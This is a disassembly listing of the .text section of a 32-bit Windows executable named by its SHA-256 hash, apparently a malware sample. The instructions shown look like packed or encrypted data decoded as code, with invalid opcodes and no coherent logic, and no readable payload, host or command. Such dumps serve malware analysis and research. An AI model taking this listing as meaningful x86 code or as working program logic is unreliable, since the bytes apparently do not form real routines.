
ab47fbefe3c560fedad63b185c469d2dc6fb72027ff1b33a1b911a7dbf7a8956.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	and    DWORD PTR [ecx+eiz*1],ebx
  401003:	and    BYTE PTR [ebx+ecx*2+0x1844040],ah
  40100a:	add    eax,0x394084c4
  40100f:	adc    BYTE PTR [edx],cl
  401011:	add    BYTE PTR [edx+0x18],dl
  401014:	add    BYTE PTR [ecx],cl
  401016:	inc    eax
  401017:	dec    eax
  401018:	add    BYTE PTR [ecx],ch
  40101a:	add    BYTE PTR [eax+eiz*2],al
  40101d:	adc    eax,DWORD PTR [edx]
  40101f:	add    BYTE PTR [eax+0x13],dl
  401022:	sbb    BYTE PTR [eax],al
  401024:	sub    esp,DWORD PTR [eax]
  401026:	dec    edx
  401027:	adc    BYTE PTR [edx],al
  401029:	add    BYTE PTR [esi+0x54090044],dl
  40102f:	nop
  401030:	(bad)  
  401031:	push   cs
  401032:	or     BYTE PTR [eax+0x5910430],0x52
  401039:	fwait
  40103a:	adc    edi,DWORD PTR [esi+0xe]
  40103d:	add    BYTE PTR [eax-0x30],cl
  401040:	rol    BYTE PTR [ebx],0x3
  401043:	add    al,0x30
  401045:	inc    eax
  401046:	inc    esi
  401047:	add    BYTE PTR [eax+0x0],0x0
  40104b:	nop
  40104c:	add    BYTE PTR [edx],ah
  40104e:	test   dl,al
  401050:	adc    eax,0x8810201
  401055:	inc    esp
  401056:	add    BYTE PTR [edx+0x2],dl
  401059:	pusha  
  40105a:	pop    esi
  40105b:	sbb    al,0x8
  40105d:	add    BYTE PTR [eax],ch
  40105f:	push   esi
  401060:	or     BYTE PTR [eax+eiz*1+0x68],al
  401064:	adc    BYTE PTR [ecx],al
  401066:	ret    
  401067:	mov    al,0x0
  401069:	test   BYTE PTR [eax+eax*1],ch
  40106c:	pusha  
  40106d:	push   ss
  40106e:	add    bh,BYTE PTR [esi]
  401070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401071:	and    ah,ah
  401073:	inc    eax
  401074:	or     BYTE PTR [eax],al
  401076:	and    al,0x80
  401078:	sub    eax,0x4741108
  40107d:	enter  0x8038,0x91
  401081:	push   edx
  401082:	add    BYTE PTR [eax],al
  401084:	les    esp,FWORD PTR [eax+0x0]
  401087:	add    al,0x20
  401089:	ror    DWORD PTR [ebx+0x16],0x18
  40108d:	nop
  40108e:	leave  
  40108f:	add    al,0x0
  401091:	push   esp
  401092:	fadd   QWORD PTR [eax+0x4c]
  401095:	and    BYTE PTR [eax],0xa9
  401098:	add    BYTE PTR [eiz*4-0x5579ebfe],al
  40109f:	adc    BYTE PTR [eax],al
  4010a1:	adc    BYTE PTR [eax-0x3b3fafef],al
  4010a7:	add    al,0xc2
  4010a9:	push   eax
  4010aa:	add    bh,BYTE PTR [eax]
  4010ac:	or     BYTE PTR ds:0x10149ac1,al
  4010b2:	add    BYTE PTR [ecx-0x18effcfb],cl
  4010b8:	or     BYTE PTR [eax+0x4],dl
  4010bb:	test   al,dl
  4010bd:	and    al,BYTE PTR [ecx+esi*1]
  4010c0:	mov    eax,DWORD PTR [ebx]
  4010c2:	loopne 0x401128
  4010c4:	add    al,0x81
  4010c6:	adc    eax,ecx
  4010c8:	inc    eax
  4010c9:	mov    BYTE PTR [eax],al
  4010cb:	add    DWORD PTR [edx-0x3c],eax
  4010ce:	add    BYTE PTR [eax+0x206852],0x45
  4010d5:	mov    bl,BYTE PTR [eax+0x52]
  4010d8:	add    BYTE PTR [eax],ah
  4010da:	add    BYTE PTR [ecx],al
  4010dc:	loop   0x401066
  4010de:	dec    eax
  4010df:	xor    DWORD PTR [eax+0x930004],eax
  4010e5:	dec    edx
  4010e6:	or     esi,DWORD PTR [eax]
  4010e8:	adc    BYTE PTR [eax],dh
  4010ea:	inc    ebp
  4010eb:	xchg   esp,eax
  4010ec:	and    DWORD PTR [eax],0x4b54c5
  4010f2:	mov    esp,0x8008a040
  4010f7:	adc    BYTE PTR [ecx],al
  4010f9:	adc    BYTE PTR ds:0x808c1c,al
  4010ff:	add    BYTE PTR [eax],al
  401101:	mov    BYTE PTR [eax+0x10000026],dh
  401107:	adc    eax,0x900084b8
  40110c:	mov    bl,BYTE PTR [eax]
  40110e:	pusha  
  40110f:	adc    BYTE PTR [eax],al
  401111:	adc    BYTE PTR [eax-0x717befd4],dh
  401117:	and    BYTE PTR [eax],0x2
  40111a:	inc    edx
  40111b:	add    eax,0x1210104
  401120:	dec    eax
  401121:	or     BYTE PTR [ecx+0x1b],cl
  401124:	inc    ebx
  401125:	pop    eax
  401126:	or     BYTE PTR [esp+ecx*1],0x1d
  40112a:	or     cl,BYTE PTR [ebx]
  40112c:	add    BYTE PTR [eax+0x20],bh
  40112f:	les    ecx,FWORD PTR [edx+0x4]
  401132:	test   DWORD PTR [eax],eax
  401134:	or     al,BYTE PTR [eax]
  401136:	adc    dh,ah
  401138:	xor    BYTE PTR [esp+ecx*1+0x48],dh
  40113c:	bound  eax,QWORD PTR [eax+0x74]
  40113f:	or     BYTE PTR [edx],bl
  401141:	jo     0x401163
  401143:	pop    es
  401144:	or     DWORD PTR [eax+0x3c],ecx
  401147:	leave  
  401148:	adc    al,BYTE PTR [ebx]
  40114a:	mov    ah,BYTE PTR [eax+0xa]
  40114d:	or     cl,BYTE PTR [edx]
  40114f:	or     dl,BYTE PTR [ecx-0x6a]
  401152:	or     BYTE PTR [edx],0xc0
  401155:	inc    eax
  401156:	adc    al,BYTE PTR [eax+0x3418000c]
  40115c:	ret    0x3001
  40115f:	and    eax,0x9220c181
  401164:	lods   eax,DWORD PTR ds:[esi]
  401165:	sub    eax,DWORD PTR [ecx+eax*1]
  401168:	and    eax,0x26401001
  40116d:	push   ecx
  40116e:	and    al,0x21
  401170:	add    DWORD PTR [eax+eiz*1+0x70d3006],0x8282010c
  40117b:	or     DWORD PTR [eax],esi
  40117d:	cmp    DWORD PTR [edx],edx
  40117f:	pop    ds
  401180:	add    BYTE PTR [eax+0x46],al
  401183:	or     BYTE PTR [eax],al
  401185:	adc    BYTE PTR [eax+0x12],cl
  401188:	or     BYTE PTR [eax+ecx*4],ah
  40118b:	sbb    BYTE PTR [ecx],al
  40118d:	cwde   
  40118e:	and    BYTE PTR [eax],cl
  401190:	and    BYTE PTR [edx],al
  401192:	sbb    BYTE PTR es:[eax+0x65],bl
  401196:	xor    al,0x84
  401198:	xchg   esp,eax
  401199:	add    BYTE PTR [eax],dl
  40119b:	add    DWORD PTR [eax+0x4a485060],ecx
  4011a1:	sbb    DWORD PTR [edx],0xa6cc204
  4011a7:	ins    BYTE PTR es:[edi],dx
  4011a8:	sbb    eax,DWORD PTR [eax+0x0]
  4011ab:	inc    esp
  4011ac:	sub    BYTE PTR [eax-0x5c],al
  4011af:	sbb    BYTE PTR [esi-0x5c],al
  4011b2:	mov    al,0x5
  4011b4:	add    al,0x12
  4011b6:	fadd   QWORD PTR [ecx]
  4011b8:	sbb    BYTE PTR [eax+eax*4+0x58],al
  4011bc:	or     ch,BYTE PTR [ebx+0x434002]
  4011c2:	push   edx
  4011c3:	inc    eax
  4011c4:	adc    al,0xb4
  4011c6:	mov    BYTE PTR [eax],al
  4011c8:	adc    dl,BYTE PTR [edx*1+0x1e800040]
  4011cf:	add    BYTE PTR [ecx+0x4181401e],dl
  4011d5:	add    BYTE PTR [eax+ebp*4+0x204700],dl
  4011dc:	nop
  4011dd:	and    ch,dh
  4011df:	add    DWORD PTR [ebx],ebp
  4011e1:	add    BYTE PTR [edi+ebx*4],0x94
  4011e5:	cs inc eax
  4011e7:	sbb    eax,0x97400200
  4011ec:	add    BYTE PTR [eax],al
  4011ee:	add    BYTE PTR [edx+0x1000aa01],al
  4011f4:	push   edx
  4011f5:	mov    al,0xa4
  4011f7:	or     BYTE PTR [eax+0x60],cl
  4011fa:	fsubr  QWORD PTR [edx]
  4011fc:	add    cl,dl
  4011fe:	adc    BYTE PTR [edx+eax*1+0x2c10293],al
  401205:	add    BYTE PTR [edx+0x704880c],cl
  40120b:	inc    eax
  40120c:	sub    BYTE PTR [eax],al
  40120e:	loopne 0x401216
  401210:	test   BYTE PTR [ecx],ch
  401212:	add    BYTE PTR [eax+ecx*2+0x10086028],al
  401219:	and    BYTE PTR [eax],0x45
  40121c:	lea    eax,[eax+0x118c0d31]
  401222:	add    al,bh
  401224:	add    al,0x31
  401226:	mov    BYTE PTR [edx+0x9c08c21],ah
  40122c:	xor    BYTE PTR [edx],al
  40122e:	or     al,0x89
  401230:	add    BYTE PTR [esi-0x5fef67d8],0x42
  401237:	add    BYTE PTR [eax],0x0
  40123a:	push   esi
  40123b:	adc    DWORD PTR [ebx],ecx
  40123d:	inc    eax
  40123e:	push   edi
  40123f:	or     eax,0x30241468
  401244:	add    BYTE PTR [edx+0x49a24000],al
  40124a:	adc    eax,0xd0442050
  40124f:	pop    ebx
  401250:	or     BYTE PTR [ebx-0x5d],bl
  401253:	add    DWORD PTR [edi+0x4],0x68928073
  40125a:	add    BYTE PTR [eax],dl
  40125c:	(bad)  
  40125d:	leave  
  40125e:	push   cs
  40125f:	mov    esp,0x10080a0
  401264:	sub    al,BYTE PTR [ecx]
  401266:	mov    cl,al
  401268:	and    BYTE PTR ds:0xcc301,0x50
  40126f:	add    eax,DWORD PTR [eax+eax*1+0x0]
  401273:	nop
  401274:	adc    al,BYTE PTR [eax]
  401276:	add    BYTE PTR [ebx+0x58],0x25
  40127a:	add    BYTE PTR [eax],cl
  40127c:	add    BYTE PTR [eax],ah
  40127e:	mov    eax,ds:0x22c0030
  401283:	mov    esi,DWORD PTR [ebp+0x23406a90]
  401289:	adc    dl,BYTE PTR [eax+0x16]
  40128c:	mov    al,ds:0x980cb84
  401291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401292:	sub    BYTE PTR [edx],al
  401294:	lods   al,BYTE PTR ds:[esi]
  401295:	pusha  
  401296:	pop    ebx
  401297:	test   BYTE PTR [ecx+eiz*1+0x40018498],al
  40129e:	add    BYTE PTR [edx+eax*4],dl
  4012a1:	cmp    BYTE PTR [edx],cl
  4012a3:	xchg   ebp,eax
  4012a4:	dec    esi
  4012a5:	xor    BYTE PTR [eax+eax*1-0x7fffbf80],al
  4012ac:	and    BYTE PTR [eax],dh
  4012ae:	add    BYTE PTR [eax],dl
  4012b0:	sbb    al,0xcc
  4012b2:	add    BYTE PTR [edx+eax*4],ah
  4012b5:	leave  
  4012b6:	xor    BYTE PTR [esi+eax*1+0x4000804],al
  4012bd:	rcl    BYTE PTR [edi],1
  4012bf:	and    BYTE PTR [ebp-0x5f9f6bff],al
  4012c5:	xor    dh,BYTE PTR [eax+eax*1+0x39002000]
  4012cc:	call   0x10405399
  4012d1:	pop    eax
  4012d2:	add    BYTE PTR [ecx],al
  4012d4:	add    al,0x92
  4012d6:	add    BYTE PTR [ecx-0x7d2dffbc],ah
  4012dc:	inc    eax
  4012dd:	add    BYTE PTR ds:0x4041a008,0x7
  4012e4:	adc    BYTE PTR [eax],0xd5
  4012e7:	mov    cs,WORD PTR [ecx+0x43c80805]
  4012ed:	mov    WORD PTR [esi],es
  4012ef:	adc    al,0x0
  4012f1:	test   BYTE PTR [esi],al
  4012f3:	loopne 0x4012b7
  4012f5:	sub    BYTE PTR [edx],0x74
  4012f8:	adc    BYTE PTR [eax],al
  4012fa:	scas   eax,DWORD PTR es:[edi]
  4012fb:	add    al,0x8
  4012fd:	add    BYTE PTR [eax+0x69c10080],dl
  401303:	add    BYTE PTR [eax+0x40],al
  401306:	dec    eax
  401307:	push   es
  401308:	les    eax,FWORD PTR [eax+0x6]
  40130b:	mov    DWORD PTR [eax],ecx
  40130d:	inc    esp
  40130e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40130f:	add    bh,BYTE PTR [ecx+0x2d1c000]
  401315:	and    DWORD PTR [eax+0x48],eax
  401318:	add    ah,BYTE PTR [eax]
  40131a:	inc    ecx
  40131b:	mov    al,ds:0x303028
  401320:	add    al,BYTE PTR [edx+0x22801080]
  401326:	pusha  
  401327:	xchg   ebp,eax
  401328:	loopne 0x40132e
  40132a:	add    al,0x84
  40132c:	and    DWORD PTR [ecx],eax
  40132e:	or     BYTE PTR [eax],0x8
  401331:	add    cl,BYTE PTR [edx]
  401333:	dec    ecx
  401334:	xor    DWORD PTR [eax],esp
  401336:	and    al,0x8e
  401338:	add    BYTE PTR [esi],dl
  40133a:	arpl   WORD PTR [eax],ax
  40133c:	cwde   
  40133d:	xor    BYTE PTR [eax],dh
  40133f:	sub    al,0x44
  401341:	xchg   BYTE PTR [eax+0x60],al
  401344:	inc    eax
  401345:	add    BYTE PTR [eax],ah
  401347:	inc    eax
  401348:	enter  0x6001,0xed
  40134c:	add    BYTE PTR [ecx+eiz*1],al
  40134f:	adc    BYTE PTR [ecx+eax*1],0x0
  401353:	mov    WORD PTR [eax+0x4c],es
  401356:	adc    BYTE PTR [edx*4+0x24804e],ah
  40135d:	jecxz  0x40136a
  40135f:	add    ah,BYTE PTR [ebx+eax*2-0x70]
  401363:	int    0xbd
  401365:	inc    ecx
  401366:	sbb    DWORD PTR fs:[esi],0x1401080
  40136d:	cmp    eax,DWORD PTR ds:0x13024010
  401373:	xor    BYTE PTR [edx],dl
  401375:	adc    BYTE PTR [edx-0x6f],al
  401378:	inc    eax
  401379:	inc    edi
  40137a:	or     DWORD PTR [eax],esp
  40137c:	mov    fs:0x20c0044a,al
  401382:	xchg   edi,eax
  401383:	cmp    al,0x6
  401385:	ss adc BYTE PTR fs:[edx],al
  401389:	push   0x10c19002
  40138e:	dec    ecx
  40138f:	add    BYTE PTR [eax],ch
  401391:	add    al,0x83
  401394:	into   
  401395:	and    BYTE PTR [eax],al
  401397:	mov    DWORD PTR [eax+0x43],eax
  40139a:	and    BYTE PTR [eax+0x20545c97],cl
  4013a0:	inc    ecx
  4013a1:	push   eax
  4013a2:	add    BYTE PTR [eax+eax*1+0x4702d202],dl
  4013a9:	mov    es,WORD PTR [eax]
  4013ab:	dec    eax
  4013ac:	add    BYTE PTR [eax],ah
  4013ae:	inc    edx
  4013af:	ins    BYTE PTR es:[edi],dx
  4013b0:	inc    esp
  4013b1:	add    DWORD PTR [edx-0x7fca6000],edx
  4013b7:	dec    eax
  4013b8:	cmp    DWORD PTR [eax],ecx
  4013ba:	add    al,0x80
  4013bc:	or     BYTE PTR [eax+esi*1],bl
  4013bf:	sub    al,0xf4
  4013c1:	cmp    ah,BYTE PTR [ecx]
  4013c3:	and    eax,0x40140045
  4013c8:	pop    eax
  4013c9:	add    BYTE PTR [eax+edx*1],dl
  4013cc:	inc    ebp
  4013cd:	and    al,0x4
  4013cf:	add    BYTE PTR [eax+0xd],cl
  4013d2:	dec    ebp
  4013d3:	and    al,0x80
  4013d5:	and    al,BYTE PTR [eax]
  4013d7:	add    cl,BYTE PTR [eax]
  4013d9:	shl    BYTE PTR [eax],0x5
  4013dc:	dec    eax
  4013dd:	lds    edx,FWORD PTR [edx-0x7fdfbf50]
  4013e3:	adc    BYTE PTR [eax+eax*4+0x0],cl
  4013e7:	or     BYTE PTR [eax],al
  4013e9:	add    dl,BYTE PTR ds:0x88036100
  4013ef:	and    BYTE PTR [edi+ebx*4+0x0],al
  4013f3:	add    BYTE PTR [ebx+edx*1],al
  4013f6:	add    al,al
  4013f8:	mov    ds:0x521a2062,al
  4013fd:	mov    al,0x30
  4013ff:	or     dl,BYTE PTR [eax+esi*1]
  401402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401403:	and    eax,eax
  401405:	ret    0x5c0
  401408:	add    DWORD PTR [eax+0x44820500],eax
  40140e:	rol    BYTE PTR [eax+0x40049b04],0xc6
  401415:	add    BYTE PTR [ecx+0x40c444],dl
  40141b:	in     al,0xb3
  40141d:	nop
  40141e:	call   0x460:0xa4028408
  401425:	sbb    BYTE PTR [edx+0x48],ah
  401428:	adc    DWORD PTR [eax+0x6841102],eax
  40142e:	adc    BYTE PTR [ecx+edx*2],ah
  401431:	and    BYTE PTR [esp+eax*1+0x1071d060],ah
  401438:	add    DWORD PTR [ecx],eax
  40143a:	fsubr  DWORD PTR [eax]
  40143c:	adc    BYTE PTR [edi],al
  40143e:	mov    ds:0x41921029,al
  401443:	push   edx
  401444:	pop    ss
  401445:	inc    eax
  401446:	add    esi,DWORD PTR [eax+ebx*2]
  401449:	adc    DWORD PTR [esi+0x10],ebx
  40144c:	sbb    BYTE PTR [eax],ah
  40144e:	arpl   WORD PTR [eax+0x204104],ax
  401454:	sbb    BYTE PTR [eax+0xa],cl
  401457:	add    al,al
  401459:	inc    eax
  40145a:	inc    esp
  40145b:	arpl   WORD PTR [eax+0x290810d3],sp
  401461:	push   edx
  401462:	rcl    BYTE PTR [esi],0x14
  401465:	or     BYTE PTR [eax+0x20060020],ch
  40146b:	dec    ecx
  40146c:	jne    0x401422
  40146e:	xor    DWORD PTR [eax],eax
  401470:	push   eax
  401471:	retf   0x2894
  401474:	enter  0x90,0x80
  401478:	and    BYTE PTR [ecx+eax*8],dh
  40147b:	mov    al,0x12
  40147d:	inc    edx
  40147e:	adc    al,0x8c
  401480:	test   DWORD PTR ds:0x401e6520,eax
  401486:	xor    esi,DWORD PTR [esp+eax*2]
  401489:	add    eax,0x40106447
  40148e:	adc    BYTE PTR [esp+esi*1+0x10],dl
  401492:	pop    eax
  401493:	add    BYTE PTR [esi+0x2101c],al
  401499:	add    BYTE PTR [eax+0x41001508],dl
  40149f:	and    al,0x40
  4014a1:	nop
  4014a2:	les    ecx,FWORD PTR [eax]
  4014a4:	push   es
  4014a5:	sbb    al,0x10
  4014a7:	adc    BYTE PTR [eax+eax*1+0x4101c80],bl
  4014ae:	add    al,0x8b
  4014b0:	cmp    ch,BYTE PTR [eax+eax*1]
  4014b3:	add    al,0x2c
  4014b5:	add    BYTE PTR [eax+ebp*1],0xa1
  4014b9:	dec    eax
  4014ba:	add    BYTE PTR [ebp+edx*1-0x7fabff4a],ah
  4014c1:	and    al,BYTE PTR [esi]
  4014c3:	and    BYTE PTR [ecx],al
  4014c5:	inc    eax
  4014c6:	add    al,0x1
  4014c8:	test   BYTE PTR [edx],al
  4014ca:	test   al,0x22
  4014cc:	mov    ds:0x800,al
  4014d1:	add    BYTE PTR [esi],al
  4014d3:	outs   dx,BYTE PTR ds:[esi]
  4014d4:	dec    eax
  4014d5:	push   es
  4014d6:	adc    al,0x0
  4014d8:	adc    DWORD PTR [eax],0x9006d1a0
  4014de:	lea    edi,[esp+ecx*2]
  4014e1:	adc    DWORD PTR [eax+eiz*1],ecx
  4014e4:	adc    BYTE PTR [esi],ah
  4014e6:	add    eax,DWORD PTR [edx]
  4014e8:	add    al,0x0
  4014ea:	inc    edx
  4014eb:	test   DWORD PTR [eax],edx
  4014ed:	call   0x4080:0x6019e28
  4014f4:	and    DWORD PTR [eax],eax
  4014f6:	retf   0x74d
  4014f9:	mov    DWORD PTR [ecx],esp
  4014fb:	inc    edx
  4014fc:	or     al,0x80
  4014fe:	adc    DWORD PTR [eax+0x9],eax
  401501:	mov    al,ds:0x4b083a07
  401506:	or     BYTE PTR [eax],dh
  401508:	and    al,0xc
  40150a:	and    BYTE PTR [edx],al
  40150c:	ror    BYTE PTR [eax],0x44
  40150f:	call   0xc08a:0xd4420340
  401516:	nop
  401517:	adc    al,0x24
  401519:	cwde   
  40151a:	dec    esp
  40151b:	loope  0x401534
  40151d:	test   BYTE PTR [ecx],dl
  40151f:	sub    al,al
  401521:	push   ecx
  401522:	inc    eax
  401523:	adc    BYTE PTR [ecx],al
  401525:	add    BYTE PTR [ecx+0x40],bl
  401528:	xchg   DWORD PTR [eax+0x51],esp
  40152b:	addr16 jns 0x40157e
  40152e:	and    al,BYTE PTR [eax+0x8]
  401531:	loopne 0x40157b
  401533:	xor    al,BYTE PTR [ecx]
  401535:	add    BYTE PTR [eax],ch
  401537:	fsub   QWORD PTR [eax]
  401539:	inc    eax
  40153a:	and    dh,al
  40153c:	dec    eax
  40153d:	and    BYTE PTR [ecx],ah
  40153f:	or     ah,BYTE PTR [eax]
  401541:	add    BYTE PTR [eax+0x4e53400],al
  401547:	loopne 0x401549
  401549:	or     bh,BYTE PTR [eax+0x62]
  40154c:	push   ebx
  40154d:	mov    al,0x60
  40154f:	adc    BYTE PTR [edx],al
  401551:	ins    BYTE PTR es:[edi],dx
  401552:	and    BYTE PTR [eax+eax*1-0x7dfb70f0],al
  401559:	add    BYTE PTR [esi],0xcb
  40155c:	add    BYTE PTR ds:0x820048,al
  401562:	inc    esi
  401563:	dec    ecx
  401564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401565:	adc    dl,BYTE PTR [edx]
  401567:	push   ss
  401568:	bound  eax,QWORD PTR [ecx]
  40156a:	xor    al,0x93
  40156c:	or     BYTE PTR [edx+0x5ac10200],al
  401572:	or     DWORD PTR [eax+0x24320a0a],eax
  401578:	adc    DWORD PTR [eax+eax*1+0x260f098b],0x10799d01
  401583:	add    cl,BYTE PTR [eax]
  401585:	enter  0xd033,0x48
  401589:	lds    ecx,FWORD PTR [esi]
  40158b:	and    al,BYTE PTR [eax]
  40158d:	add    ecx,DWORD PTR [edi+eax*1]
  401590:	add    al,0x1c
  401592:	adc    DWORD PTR [eax+0x64],eax
  401595:	xchg   ebx,eax
  401596:	or     BYTE PTR [esi-0x60],al
  401599:	inc    edx
  40159a:	add    BYTE PTR [ecx+0x10c88418],dh
  4015a0:	cmp    BYTE PTR [esi],ah
  4015a2:	mov    ds:0xa0080c42,al
  4015a7:	xchg   esi,eax
  4015a8:	mov    dl,0x18
  4015aa:	adc    eax,0x52204101
  4015af:	xchg   ebx,eax
  4015b0:	and    BYTE PTR [edx],ch
  4015b2:	and    BYTE PTR [ebp+0x44000102],ah
  4015b8:	inc    eax
  4015b9:	and    DWORD PTR [ecx+0x86024e],ebp
  4015bf:	add    al,BYTE PTR [eax+eax*1]
  4015c2:	and    BYTE PTR [edx+0x50],0x18
  4015c6:	add    BYTE PTR [esp+edx*1],cl
  4015c9:	add    BYTE PTR [eax+0x201041],ah
  4015cf:	pusha  
  4015d0:	add    BYTE PTR [edx+0x4],ah
  4015d3:	inc    eax
  4015d4:	mov    ds:0xd1a02804,eax
  4015d9:	inc    eax
  4015da:	or     DWORD PTR [eax-0x7f7f7f78],esi
  4015e0:	test   DWORD PTR es:[eax-0x6b],eax
  4015e4:	icebp  
  4015e5:	push   es
  4015e6:	and    eax,0x21270901
  4015eb:	and    al,0x0
  4015ed:	push   es
  4015ee:	add    al,0x61
  4015f0:	add    BYTE PTR [eax],ch
  4015f2:	inc    eax
  4015f3:	push   eax
  4015f4:	add    BYTE PTR [eax+0x50102000],ah
  4015fa:	adc    BYTE PTR [ecx+0x36072200],al
  401600:	cmp    BYTE PTR [eax],al
  401602:	push   ss
  401603:	push   ss
  401604:	inc    esp
  401605:	or     edx,DWORD PTR [eax+0x40]
  401608:	sbb    BYTE PTR [esp+edx*1],dh
  40160b:	or     ecx,DWORD PTR [eax]
  40160d:	inc    edx
  40160e:	dec    ecx
  40160f:	adc    al,BYTE PTR [eax]
  401611:	add    BYTE PTR [eax+0x2],al
  401614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401615:	push   eax
  401616:	or     edx,eax
  401618:	pusha  
  401619:	mov    al,ds:0xc5155d2a
  40161e:	add    ah,cl
  401620:	xor    dl,BYTE PTR gs:[edx+0x12a4501b]
  401627:	dec    esp
  401628:	push   eax
  401629:	add    al,0x83
  40162b:	inc    esp
  40162c:	add    BYTE PTR [edx+ebp*8+0x0],ah
  401630:	int3   
  401631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401632:	and    BYTE PTR [ebx+0x20],al
  401635:	xor    BYTE PTR [ecx-0x6a],0x68
  401639:	and    BYTE PTR [edx],dl
  40163b:	int3   
  40163c:	bound  eax,QWORD PTR [eax]
  40163e:	imul   edx,DWORD PTR [edx+ecx*1],0xa006025
  401645:	add    BYTE PTR ds:0x384c020,dl
  40164b:	je     0x401651
  40164d:	inc    ecx
  40164e:	or     BYTE PTR [eax+0x23],cl
  401651:	jb     0x246056da
  401657:	mov    al,ds:0x20a69001
  40165c:	inc    eax
  40165d:	add    al,0x12
  40165f:	daa    
  401660:	add    DWORD PTR [eax+0x19],esp
  401663:	sbb    DWORD PTR [ecx+eax*1+0x2],esp
  401667:	adc    al,0xf
  401669:	adc    BYTE PTR [eax+0x0],0x9
  40166d:	add    al,BYTE PTR [eax-0x3ff57e00]
  401673:	test   DWORD PTR [eax+esi*1],ecx
  401676:	sub    BYTE PTR [ebx+0x2],al
  401679:	add    BYTE PTR [eax],al
  40167b:	or     al,0xc8
  40167d:	or     cl,BYTE PTR [edx-0x3bef6fcb]
  401683:	mov    al,0x8
  401685:	add    cl,BYTE PTR [eax+0x20100001]
  40168b:	and    eax,DWORD PTR [ecx+eax*4+0x40]
  40168f:	sub    BYTE PTR [ecx],al
  401691:	adc    BYTE PTR [ecx],cl
  401693:	or     DWORD PTR [edx+0xd1024],edi
  401699:	add    BYTE PTR es:[ebx+0x41134808],ah
  4016a0:	mov    al,ds:0x906804bc
  4016a5:	add    BYTE PTR [ecx],ah
  4016a7:	add    BYTE PTR ds:0xc4809010,ah
  4016ad:	adc    DWORD PTR [eax+ecx*4],edx
  4016b0:	and    al,0x6f
  4016b2:	sub    BYTE PTR [eax],cl
  4016b4:	cmp    DWORD PTR [ecx],eax
  4016b6:	and    BYTE PTR [esi+0x10],0x20
  4016ba:	inc    esp
  4016bb:	add    dl,bl
  4016bd:	or     BYTE PTR [eax],0x10
  4016c0:	add    al,0x3c
  4016c2:	xchg   ebp,eax
  4016c3:	and    BYTE PTR [ecx],bh
  4016c5:	inc    ecx
  4016c6:	sbb    DWORD PTR [eax-0x4c],esp
  4016c9:	or     DWORD PTR [eax+0x1144a0],0xffffff8c
  4016d0:	add    DWORD PTR [edx],eax
  4016d2:	and    BYTE PTR [eax],cl
  4016d4:	jo     0x40172c
  4016d6:	or     BYTE PTR [ebx],al
  4016d8:	mov    al,0x2
  4016da:	adc    BYTE PTR [eax],cl
  4016dc:	add    BYTE PTR [edx],al
  4016de:	and    BYTE PTR [ecx],dl
  4016e0:	cmp    DWORD PTR [eax-0x60],ebx
  4016e3:	sub    al,0x79
  4016e5:	push   es
  4016e6:	nop
  4016e7:	adc    BYTE PTR [eax],ah
  4016e9:	and    al,dl
  4016eb:	sbb    BYTE PTR [ecx],al
  4016ed:	sub    BYTE PTR ds:0x14040164,dh
  4016f3:	push   0x482180c
  4016f8:	push   es
  4016f9:	and    BYTE PTR [edx+0x6],al
  4016fc:	sub    esi,DWORD PTR [ebx+0x480a0510]
  401702:	xchg   ebx,eax
  401703:	mov    al,ds:0x16201256
  401708:	pop    es
  401709:	and    ebx,DWORD PTR [eax]
  40170b:	add    al,0x60
  40170d:	dec    esp
  40170e:	push   ebp
  40170f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401710:	and    DWORD PTR [eax],eax
  401712:	add    al,0x3e
  401714:	xor    BYTE PTR [ecx-0x2fafe7d0],dh
  40171a:	inc    edx
  40171b:	or     BYTE PTR [eax+ecx*1],0x40
  40171f:	or     BYTE PTR [eax],al
  401721:	mov    al,0x85
  401723:	rcr    BYTE PTR [eax],1
  401725:	inc    edi
  401726:	adc    BYTE PTR [edx],dl
  401728:	add    DWORD PTR [eax],ecx
  40172a:	adc    dh,BYTE PTR [ebx+0x10]
  40172d:	test   BYTE PTR [eax+0x46],dh
  401730:	test   BYTE PTR [ecx],al
  401732:	and    al,BYTE PTR [edi]
  401734:	mov    ds:0x22822200,al
  401739:	sbb    al,0x2
  40173b:	inc    esp
  40173c:	es inc esp
  40173e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40173f:	inc    ecx
  401740:	and    BYTE PTR [ecx+0x40],cl
  401743:	push   ebp
  401744:	add    BYTE PTR [eax],0x40
  401747:	arpl   WORD PTR [eax],ax
  401749:	test   BYTE PTR [eax],al
  40174b:	pop    ds
  40174c:	nop
  40174d:	adc    BYTE PTR [eax+0x6],al
  401750:	ret    0x4000
  401753:	or     BYTE PTR ds:0x80865450,dl
  401759:	cmp    BYTE PTR [ecx],bh
  40175b:	or     BYTE PTR [eax-0x70],dh
  40175e:	inc    eax
  40175f:	dec    ecx
  401760:	and    BYTE PTR [eax-0x6f],al
  401763:	nop
  401764:	or     BYTE PTR [edx+0x50],dl
  401767:	add    al,BYTE PTR [eax]
  401769:	xor    al,0x22
  40176b:	xor    BYTE PTR [ebx],cl
  40176d:	mov    BYTE PTR [eax+edx*1],ah
  401770:	mov    BYTE PTR [edx],al
  401772:	push   eax
  401773:	out    dx,eax
  401774:	add    DWORD PTR [esp+eax*1+0x1a],0x96101089
  40177c:	sub    DWORD PTR [edx],esi
  40177e:	cmp    edx,DWORD PTR [ebx+0x6]
  401781:	xchg   ecx,eax
  401782:	pop    ebp
  401783:	sub    al,dl
  401785:	push   ecx
  401786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401787:	popa   
  401788:	mov    DWORD PTR [eax+0x64],0x40642e20
  40178f:	sbb    dl,ah
  401791:	or     BYTE PTR [edx],al
  401793:	in     eax,0x66
  401795:	xor    BYTE PTR [eax],cl
  401797:	add    BYTE PTR [ecx],al
  401799:	inc    eax
  40179a:	shl    BYTE PTR [eax-0x73fbfbec],0x8
  4017a1:	and    al,0x14
  4017a3:	and    BYTE PTR [ecx],cl
  4017a5:	or     al,0x22
  4017a7:	loopne 0x4017b1
  4017a9:	push   eax
  4017aa:	adc    BYTE PTR [eax],0x20
  4017ad:	or     BYTE PTR [eax+0x8],al
